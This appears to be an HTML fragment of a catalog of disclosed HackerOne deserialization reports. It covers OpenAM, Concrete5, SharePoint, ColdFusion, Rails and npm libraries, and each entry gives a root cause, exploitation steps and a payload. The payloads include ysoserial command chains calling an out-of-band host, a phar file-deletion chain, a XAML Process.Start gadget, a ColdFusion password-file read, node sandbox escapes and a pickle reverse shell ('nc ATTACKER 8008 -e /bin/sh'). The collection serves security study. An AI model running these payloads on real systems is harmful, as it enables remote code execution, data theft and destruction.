+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/473888" target="_blank" rel="noopener">hackerone.com/reports/473888</a></span><a class="src" href="#report-473888" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1248052" style="--sv:var(--sev-high)" data-sev="3" data-votes="30" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Pre-auth Java deserialization RCE in ForgeRock OpenAM (CVE-2021-35464)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1248052</b> · deptofdefense · none · 30 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">OpenAM's Jato framework deserializes the jato.pageSession request parameter without validation, so an unauthenticated attacker can supply a malicious serialized Java object (ysoserial gadget) to reach RCE.</p>
+<h4>Method</h4><ol><li>Fingerprint OpenAM (e.g. /openam/ccversion/Version endpoint is reachable pre-auth)</li><li>Build a ysoserial gadget (Click1 chain works against OpenAM's classpath), prepend a null byte, base64+URL-safe encode and strip padding/newlines</li><li>Send it as jato.pageSession on the Version endpoint; a 302 to AMInvalidURL plus the out-of-band callback confirms execution</li></ol>
+<div class="pre">java -jar ysoserial-all.jar Click1 "curl https://COLLAB" | (echo -ne \x00 &amp;&amp; cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\n' &gt; payload.txt
+
+GET /openam/ccversion/Version?jato.pageSession=PAYLOAD HTTP/1.1
+Host: TARGET</div>
+<p class="insight"><b>Insight —</b> Any framework that stores/round-trips state in a serialized, client-supplied parameter (jato.pageSession here) is a deserialization sink; base64+URL-safe transform and a leading null byte are common wrappers to survive HTTP transport and framework parsing.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1248052" target="_blank" rel="noopener">hackerone.com/reports/1248052</a></span><a class="src" href="#report-1248052" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-921288" style="--sv:var(--sev-high)" data-sev="3" data-votes="28" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Concrete5 phar:// deserialization -&gt; POP chain arbitrary file delete (CVE-2021-40102)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#921288</b> · concretecms · none · 28 votes · resolved</div>
+<div class="taxo"><span>Program <b>concretecms</b></span><span>Surface <b>web</b></span><span>Chain <b>file upload (image filter bypass) -&gt; phar:// via is_dir()</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The storage-location 'Add Location' flow passes the user 'path' straight into is_dir(); a phar:// path deserializes the Phar metadata, and a POP chain (VolatileDirectory::__destruct -&gt; Filesystem::deleteDirectory -&gt; unlink) deletes arbitrary files/directories.</p>
+<h4>Method</h4><ol><li>Generate a Phar whose metadata is a VolatileDirectory object with -&gt;path set to the directory to delete; rename it to .png to pass the upload filter.</li><li>Upload it via the File Manager.</li><li>Dashboard -&gt; System &amp; Settings -&gt; File Storage Location -&gt; Add Location, set path to phar://./application/files/&lt;id&gt;/exploit.png; is_dir() triggers deserialization and the __destruct gadget runs on shutdown.</li></ol>
+<div class="pre">&lt;?php
+namespace Illuminate\Filesystem { class Filesystem {} }
+namespace Concrete\Core\File\Service {
+  class VolatileDirectory {
+    protected $filesystem; protected $path;
+    function __construct(){ $this-&gt;filesystem = new \Illuminate\Filesystem\Filesystem; $this-&gt;path = '/var/www/html/target_dir'; }
+  }
+}
+namespace {
+  $p = new Phar('exploit.phar'); $p-&gt;startBuffering();
+  $p-&gt;setStub('&lt;?php __HALT_COMPILER();');
+  $p-&gt;setMetadata(new \Concrete\Core\File\Service\VolatileDirectory);
+  $p-&gt;addFromString('a.txt','x'); $p-&gt;stopBuffering();
+  rename('exploit.phar','exploit.png');
+}
+// trigger path: phar://./application/files/6815/9449/9442/exploit.png</div>
+<p class="insight"><b>Insight —</b> phar:// deserialization needs only a filesystem-function sink (is_dir/file_exists) plus a way to plant a file; find a __destruct/__wakeup gadget in the app or its vendored libs (illuminate/filesystem here) to reach unlink/rmdir/eval. Rename the phar to an allowed image extension to defeat upload filters.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/921288" target="_blank" rel="noopener">hackerone.com/reports/921288</a></span><a class="src" href="#report-921288" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-534630" style="--sv:var(--sev-high)" data-sev="3" data-votes="13" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>SharePoint CVE-2019-0604 XAML ObjectDataProvider deserialization -&gt; unauth RCE</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#534630</b> · deptofdefense · none · 13 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>unauth request -&gt; XAML deserialization -&gt; Process.Star</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">SharePoint deserializes untrusted XML from the ItemPicker (picker.aspx hiddenSpanData) without type restriction, so a XAML ObjectDataProvider gadget instantiating System.Diagnostics.Process.Start runs arbitrary OS commands as the SharePoint service account.</p>
+<h4>Method</h4><ol><li>Build a XAML ResourceDictionary with an ObjectDataProvider that calls Process.Start(cmd.exe, /c &lt;command&gt;)</li><li>Encode it to the SharePoint __ format (ConsoleApplication1.exe t.xml)</li><li>Load /_layouts/15/picker.aspx?PickerDialogType=ItemPickerDialog..., intercept, set ctl00$...$hiddenSpanData to the encoded blob</li><li>Send -&gt; command executes server-side (verify via ping/OOB)</li></ol>
+<div class="pre">&lt;ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:System="clr-namespace:System;assembly=mscorlib" xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system"&gt;
+  &lt;ObjectDataProvider x:Key="x" ObjectType="{x:Type Diag:Process}" MethodName="Start"&gt;
+    &lt;ObjectDataProvider.MethodParameters&gt;
+      &lt;System:String&gt;cmd.exe&lt;/System:String&gt;
+      &lt;System:String&gt;/c ping COLLAB&lt;/System:String&gt;
+    &lt;/ObjectDataProvider.MethodParameters&gt;
+  &lt;/ObjectDataProvider&gt;
+&lt;/ResourceDictionary&gt;</div>
+<p class="insight"><b>Insight —</b> .NET XML/XAML sinks that deserialize without a type allowlist are RCE via ObjectDataProvider-&gt;Process.Start. When you see picker.aspx / hiddenSpanData / __-prefixed encoded params on SharePoint (or any XmlSerializer/LosFormatter surface), test this gadget.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/534630" target="_blank" rel="noopener">hackerone.com/reports/534630</a></span><a class="src" href="#report-534630" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1702859" style="--sv:var(--sev-high)" data-sev="3" data-votes="12" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>JSON.load (json_class) deserializes unexpected Ruby classes (Rails Kredis CVE-2023-27531)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1702859</b> · rails · none · 12 votes · resolved</div>
+<div class="taxo"><span>Program <b>rails</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Kredis::Type::Json#cast_value uses JSON.load (not JSON.parse); JSON.load honors the 'json_class' key and, with json/add/core loaded, reconstructs arbitrary classes (String, Regexp, ...) from JSON, so untrusted JSON stored in Redis deserializes into unexpected objects (e.g. Regexp -&gt; ReDoS).</p>
+<h4>Method</h4><ol><li>Store attacker JSON containing {"json_class":"Regexp",...} in a Kredis JSON value.</li><li>Reading json.value calls JSON.load and instantiates the declared class instead of a plain Hash.</li></ol>
+<div class="pre">require 'json/add/core'
+json.value = /evil/.as_json   # =&gt; {"json_class"=&gt;"Regexp","o"=&gt;0,"s"=&gt;"evil"}
+json.value                    # =&gt; /evil/  (real Regexp object, not a Hash)</div>
+<p class="insight"><b>Insight —</b> In Ruby, JSON.load (and Marshal.load, YAML.load) is unsafe on untrusted input -- the json_class hook plus json/add/* revives real objects. Always use JSON.parse. Grep libraries for JSON.load on stored/user data.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1702859" target="_blank" rel="noopener">hackerone.com/reports/1702859</a></span><a class="src" href="#report-1702859" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-2248781" style="--sv:var(--sev-high)" data-sev="3" data-votes="11" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Unauthenticated arbitrary file read via WDDX deserialization + _metadata.classname traversal (ColdFusion CVE-2023-26360)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#2248781</b> · deptofdefense · none · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>unauth deserialization -&gt; arbitrary file read -&gt; CF ad</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An unauthenticated ColdFusion CFC endpoint deserializes untrusted _variables input; a crafted _metadata.classname containing path traversal makes the server read and return an arbitrary file (e.g. lib/password.properties) with no auth.</p>
+<h4>Method</h4><ol><li>POST to a reachable CFC method (e.g. iedit.cfc?method=wizardHash&amp;_cfclient=true&amp;returnFormat=wddx&amp;inPassword=foo)</li><li>Send a URL-encoded _variables blob whose _metadata.classname is a traversal path to the target file</li><li>Read the file (e.g. the CF admin password hash) from the response</li></ol>
+<div class="pre">POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=wizardHash&amp;_cfclient=true&amp;returnFormat=wddx&amp;inPassword=foo HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+_variables=%7b%22_metadata%22%3a%7b%22classname%22%3a%22i/../lib/password.properties%22%7d%2c%22_variables%22%3a%5b%5d%7d</div>
+<p class="insight"><b>Insight —</b> ColdFusion endpoints exposing _cfclient=true + returnFormat=wddx deserialize attacker input; _metadata.classname is a file-read/RCE sink. Test both /CFIDE/... and /cf_scripts/.../iedit.cfc method endpoints against unpatched CF 2018/2021.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2248781" target="_blank" rel="noopener">hackerone.com/reports/2248781</a></span><a class="src" href="#report-2248781" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1248040" style="--sv:var(--sev-high)" data-sev="3" data-votes="11" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Pre-auth Java deserialization RCE in ForgeRock OpenAM (CVE-2021-35464)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1248040</b> · deptofdefense · none · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>unauth param deserialization -&gt; ysoserial gadget -&gt; RC</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">OpenAM's Jato framework deserializes an untrusted, base64/URL-safe-encoded parameter without authentication, allowing a ysoserial gadget chain (Click1) to execute OS commands pre-auth.</p>
+<h4>Method</h4><ol><li>Build a gadget payload with ysoserial (Click1 chain) for the command</li><li>base64 + URL-safe transform + prepend a NUL byte as Jato expects</li><li>Send it as the vulnerable GET parameter to the OpenAM endpoint</li><li>Confirm via out-of-band (Burp Collaborator) callback</li></ol>
+<div class="pre">java -jar ysoserial-all.jar Click1 "curl https://COLLAB/" | (echo -ne '\x00' &amp;&amp; cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\n' &gt; payload.txt
+# GET /openam/....=&lt;payload&gt; HTTP/1.1  (Jato deserialization endpoint)</div>
+<p class="insight"><b>Insight —</b> Java frameworks that deserialize a request parameter (Jato, others) are pre-auth RCE when a gadget is on the classpath; use ysoserial and confirm blind exploitation with an OOB collaborator callback. The leading NUL + URL-safe base64 is the Jato-specific encoding wrapper.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1248040" target="_blank" rel="noopener">hackerone.com/reports/1248040</a></span><a class="src" href="#report-1248040" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-416004" style="--sv:var(--sev-high)" data-sev="3" data-votes="11" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>LFI -&gt; PHP object injection -&gt; XXE -&gt; SSRF -&gt; pickle RCE chain</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#416004</b> · h1-5411-ctf · none · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>h1-5411-ctf</b></span><span>Surface <b>web</b></span><span>Chain <b>LFI -&gt; source disclosure -&gt; PHP object injection -&gt;</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A meme generator exposes local file read via the template param; downloaded source reveals an import endpoint that unserialize()s uploaded base64 into a ConfigFile whose __toString() parses attacker XML with external entities enabled, yielding XXE/SSRF that reaches an internal pickle-deserializing API.</p>
+<h4>Method</h4><ol><li>Read local files via template=../../ (LFI) and pull application source</li><li>Find import_memes endpoint: unserialize(base64_decode(uploaded_file))</li><li>Craft serialized ConfigFile with config_raw = malicious DTD; __toString() (called when session memes are echoed) runs loadXML with LIBXML_NOENT|LIBXML_DTDLOAD -&gt; XXE</li><li>Use XXE http:// wrapper to reach internal service on :1337</li><li>status?debug=1 leaks base64 python pickle; update-status?status=&lt;pickle&gt; deserializes -&gt; RCE</li></ol>
+<div class="pre"># LFI
+?template=../../includes/config.php&amp;type=text
+
+# PHP object injection (base64 of):
+O:10:"ConfigFile":1:{s:10:"config_raw";s:...:"&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM \"http://localhost:1337/update-status?status=BASE64_PICKLE\"&gt;]&gt;&lt;root&gt;&lt;toptext&gt;&amp;xxe;&lt;/toptext&gt;&lt;type&gt;text&lt;/type&gt;&lt;/root&gt;";}
+
+# pickle RCE gadget
+class payload(object):
+    def __reduce__(self):
+        return (os.system, ('nc ATTACKER 8008 -e /bin/sh',))</div>
+<p class="insight"><b>Insight —</b> Chain multiplier: LFI to get source lets you discover unserialize/loadXML/pickle sinks then bridge them. PHP __toString() is a reachable object-injection trigger whenever the object is echoed (e.g. session render).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/416004" target="_blank" rel="noopener">hackerone.com/reports/416004</a></span><a class="src" href="#report-416004" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1067291" style="--sv:var(--sev-high)" data-sev="3" data-votes="10" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>PrimeFaces 5.x pre-5.3.8 EL-injection RCE (CVE-2017-1000486)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1067291</b> · deptofdefense · none · 10 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">PrimeFaces 5.x uses a weak/hardcoded password and predictable primefaces AES padding for its DataExporter/expression handling, letting an unauthenticated attacker inject an EL expression that executes as the app (tomcat) user.</p>
+<h4>Method</h4><ol><li>Fingerprint PrimeFaces version (JS/resource paths) and confirm &lt; 5.3.8</li><li>Run the public exploit against the app path</li><li>Execute commands as tomcat</li></ol>
+<div class="pre">python primefaces.py https://TARGET/ftn-Website/ -c id
+# -&gt; uid=91(tomcat) gid=91(tomcat) ...</div>
+<p class="insight"><b>Insight —</b> Version-fingerprint front-end frameworks (PrimeFaces, Struts, JSF) and map to known EL/deserialization CVEs; PrimeFaces resource URLs leak the exact version. Unauth RCE on tomcat is a strong pivot point.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1067291" target="_blank" rel="noopener">hackerone.com/reports/1067291</a></span><a class="src" href="#report-1067291" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-350418" style="--sv:var(--sev-high)" data-sev="3" data-votes="8" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>cryo npm __proto__ + serialized valueOf -&gt; RCE on object use</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#350418</b> · nodejs-ecosystem · none · 8 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>api</b></span></div>
+<h4>Root cause</h4><p style="margin:0">cryo rebuilds objects from JSON with bracket assignment (obj[key]=value) and supports function serialization, so attacker JSON can set __proto__ and provide malicious toString/valueOf; the code runs the moment the app touches the object (e.g. string coercion).</p>
+<h4>Method</h4><ol><li>App calls Cryo.parse on attacker-controlled JSON</li><li>Craft frozen JSON that sets __proto__ to an object with a serialized valueOf/toString function</li><li>When app uses the object (console.log/concat), the function executes</li></ol>
+<div class="pre">var frozen = '{"root":"_CRYO_REF_3","references":[{"contents":{},"value":"_CRYO_FUNCTION_function () {console.log(\\"pwn\\"); return 1111;}"},{"contents":{},"value":"_CRYO_FUNCTION_function () {return 2222;}"},{"contents":{"toString":"_CRYO_REF_0","valueOf":"_CRYO_REF_1"},"value":"_CRYO_OBJECT_"},{"contents":{"__proto__":"_CRYO_REF_2"},"value":"_CRYO_OBJECT_"}]}';
+Cryo.parse(frozen);</div>
+<p class="insight"><b>Insight —</b> Node serialization libs that (a) allow function deserialization or (b) do raw obj[key]=value are RCE/prototype-pollution sinks; check any Cryo/node-serialize/funcster-style parse fed untrusted JSON. The valueOf/toString trigger fires on incidental object use, no direct invocation needed.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/350418" target="_blank" rel="noopener">hackerone.com/reports/350418</a></span><a class="src" href="#report-350418" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1249456" style="--sv:var(--sev-high)" data-sev="3" data-votes="8" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>ForgeRock OpenAM pre-auth Java deserialization RCE (CVE-2021-35464)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1249456</b> · deptofdefense · none · 8 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">OpenAM's Jato framework deserializes an attacker-controlled, base64url-encoded parameter without authentication, so a ysoserial gadget yields unauthenticated RCE.</p>
+<h4>Method</h4><ol><li>Build a ysoserial Click1 payload with your command, prepend a null byte, base64url-encode it</li><li>Send it in the vulnerable OpenAM GET parameter</li><li>Confirm via out-of-band callback (Burp Collaborator)</li></ol>
+<div class="pre">java -jar ysoserial.jar Click1 "curl https://COLLAB" | (echo -ne \\x00 &amp;&amp; cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\n' &gt; payload.txt
+# then: GET /openam/...=&lt;payload&gt; HTTP/1.1</div>
+<p class="insight"><b>Insight —</b> Fingerprint SSO/IAM stacks (OpenAM, Crowd, etc.) and match to deserialization CVEs; encode ysoserial output as base64url and remember the leading null-byte quirk. Use OOB (Collaborator) to confirm blind RCE.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1249456" target="_blank" rel="noopener">hackerone.com/reports/1249456</a></span><a class="src" href="#report-1249456" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-350401" style="--sv:var(--sev-high)" data-sev="3" data-votes="7" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>funcster npm IIFE executes during deserialization -&gt; OS command exec</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#350401</b> · nodejs-ecosystem · none · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>api</b></span></div>
+<h4>Root cause</h4><p style="margin:0">funcster rebuilds functions by wrapping serialized source in a generated module (module.exports=(function(module,exports){return{...};})()); an IIFE embedded in the serialized function runs immediately at deserialize time, and this.constructor.constructor('return process')() escapes the sandbox to reach process for command execution.</p>
+<h4>Method</h4><ol><li>App calls funcster.deepDeserialize on attacker JSON</li><li>Supply a __js_function whose body is an IIFE (ends with () ) so it self-invokes during rebuild</li><li>Use this.constructor.constructor('return process')() to obtain process and spawn a command</li></ol>
+<div class="pre">var serJSON = { __js_function: "function testa(){var process = this.constructor.constructor('return process')(); var spawn_sync = process.binding('spawn_sync'); /* build spawnSync */ var x = spawnSync('whoami'); process.stdout.write(x.output.toString());}()" };
+funcster.deepDeserialize(serJSON);</div>
+<p class="insight"><b>Insight —</b> For node function-deserializers, an IIFE (trailing ()) forces execution at parse time, and constructor.constructor('return process')() is the universal escape from a restricted context to Node internals (process.binding('spawn_sync')). Reusable across sandbox-escape scenarios.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/350401" target="_blank" rel="noopener">hackerone.com/reports/350401</a></span><a class="src" href="#report-350401" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-390860" style="--sv:var(--sev-high)" data-sev="3" data-votes="6" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Prototype pollution via object-path setter (mpath)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#390860</b> · nodejs-ecosystem · none · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>other</b></span><span>Chain <b>prototype pollution -&gt; gadget in downstream sink (templat</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A MongoDB-style path setter walks/creates nested object keys from an attacker-controlled path string without blacklisting __proto__/constructor/prototype, so a path like __proto__.x writes onto Object.prototype, polluting every object in the runtime.</p>
+<h4>Method</h4><ol><li>Reach an API where a path/key string is passed to the object setter (mpath.set) with attacker-controlled path</li><li>Supply a path beginning with __proto__ (or constructor.prototype)</li><li>The setter creates/overwrites the property on Object.prototype</li><li>Newly created objects inherit the injected property; escalate to DoS, auth bypass, or RCE depending on downstream sinks (e.g. template engines)</li></ol>
+<div class="pre">var mpath = require('mpath');
+var obj = { comments: [ {title:'funny'}, {title:'exciting!'} ] };
+mpath.set('__proto__.x', ['hilarious','fruity'], obj);
+console.log({}.x); // ['hilarious','fruity']</div>
+<p class="insight"><b>Insight —</b> Any recursive setter/merge that accepts a user-supplied key path is a prototype-pollution sink; test __proto__.&lt;x&gt; and constructor.prototype.&lt;x&gt;. Impact hinges on the consumer (mongoose here) actually letting attackers control the path, so trace whether the path reaches user input.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/390860" target="_blank" rel="noopener">hackerone.com/reports/390860</a></span><a class="src" href="#report-390860" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-413388" style="--sv:var(--sev-high)" data-sev="3" data-votes="2" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Rails cache raw:true auto Marshal.load of untrusted values -&gt; RCE (CVE-2020-8165)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#413388</b> · rails · none · 2 votes · resolved</div>
+<div class="taxo"><span>Program <b>rails</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">ActiveSupport MemCacheStore/RedisCacheStore auto Marshal.load values on read even when written with raw:true, so any app that caches an attacker-influenced string with raw:true and reads it back deserializes untrusted Marshal data with no app-code bug required.</p>
+<h4>Method</h4><ol><li>Find app code that fetches a remote/attacker-influenced string into Rails.cache with raw:true (e.g. caching an HTTP response body).</li><li>Get an attacker-controlled Marshal blob into that cache value (poison the upstream/remote source the app caches).</li><li>On the next cache read, Rails silently Marshal.loads the blob; a generic ERB DeprecatedInstanceVariableProxy gadget yields RCE.</li></ol>
+<div class="pre">require 'erb'; require 'rails/all'
+remote_code = "puts 'HACKED'\n"
+erb = ERB.allocate
+erb.instance_variable_set(:@src, remote_code)
+erb.instance_variable_set(:@lineno, 0)
+deprecation = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result)
+exploit_data = Marshal.dump(deprecation)
+# any string put in a raw:true cache slot is Marshal.load'ed on read:
+# Marshal.load(exploit_data) -&gt; ERB @src executes
+
+# demonstration that raw:true still unmarshals:
+cache = ActiveSupport::Cache::MemCacheStore.new('localhost')
+cache.fetch("demo", raw:true){ Marshal.dump(:sym) }
+cache.fetch("demo", raw:true) # =&gt; :sym  (deserialized!)</div>
+<p class="insight"><b>Insight —</b> Framework-level deserialization sinks hide in cache/session/serialization layers, not just obvious endpoints. On Rails targets, look for raw:true cache usage feeding on untrusted upstreams; the ERB DeprecatedInstanceVariableProxy Marshal gadget is a reliable universal Ruby RCE payload.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/413388" target="_blank" rel="noopener">hackerone.com/reports/413388</a></span><a class="src" href="#report-413388" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-73257" style="--sv:var(--sev-high)" data-sev="3" data-votes="1" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>YAML !php/object tag reaches unserialize() -&gt; PHP object injection/RCE</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#73257</b> · ibb · awarded · 1 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span><span>Chain <b>YAML parse -&gt; unserialize() -&gt; object injection / POP </b></span></div>
+<h4>Root cause</h4><p style="margin:0">PHP's yaml_parse*() is documented as safe, but the undocumented !php/object tag invokes unserialize() on attacker YAML, instantiating arbitrary classes and firing __destruct/__wakeup gadgets; yaml_parse_url even fetches the YAML from a remote URL.</p>
+<h4>Method</h4><ol><li>Find code that parses attacker-influenced YAML with yaml_parse/yaml_parse_file/yaml_parse_url.</li><li>Embed a !php/object tag carrying a serialized object of a class with a dangerous __destruct/__wakeup.</li><li>Parsing deserializes it, triggering the gadget chain (POP -&gt; file write/RCE).</li></ol>
+<div class="pre">&lt;?php
+class A { function __destruct(){ echo 'destructor invoked'; } }
+yaml_parse('x: !php/object O:1:"A":0:{}');
+// remote-fetch variant:
+yaml_parse_url('http://attacker/yaml.txt');</div>
+<p class="insight"><b>Insight —</b> 'Safe' serializers are not safe once they expose a language-object tag: audit YAML/JSON/XML parsers for !php/object, !!python/object, Java @type, etc. yaml_parse_url turns this into a full SSRF+deserialization primitive since the payload is fetched from an attacker URL.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/73257" target="_blank" rel="noopener">hackerone.com/reports/73257</a></span><a class="src" href="#report-73257" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-55030" style="--sv:var(--sev-high)" data-sev="3" data-votes="1" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>SoapClient::__call type confusion via unserialize()</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#55030</b> · ibb · awarded · 1 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span><span>Chain <b>unserialize() of attacker data -&gt; type confusion in SoapC</b></span></div>
+<h4>Root cause</h4><p style="margin:0">PHP soap.c reads the __default_headers property with Z_ARRVAL_P without checking its type; a crafted unserialize() payload sets __default_headers to an integer, so when a method is called on the object the engine treats a scalar as a HashTable -&gt; type confusion -&gt; arbitrary read/write and code execution.</p>
+<h4>Method</h4><ol><li>Find a sink that unserialize()s attacker data (cookie, cache, hidden field).</li><li>Supply a serialized SoapClient object whose __default_headers property is a scalar (e.g. int).</li><li>Any method call on the resulting object (via __call magic) dereferences the scalar as an array, crashing/corrupting memory.</li></ol>
+<div class="pre">&lt;?php
+$dummy = unserialize('O:10:"SoapClient":3:{s:3:"uri";s:1:"a";s:8:"location";s:22:"http://localhost/a.xml";s:17:"__default_headers";i:1337;}');
+var_dump($dummy-&gt;whatever()); // Z_ARRVAL_P on i:1337 -&gt; SIGSEGV @ 0x539</div>
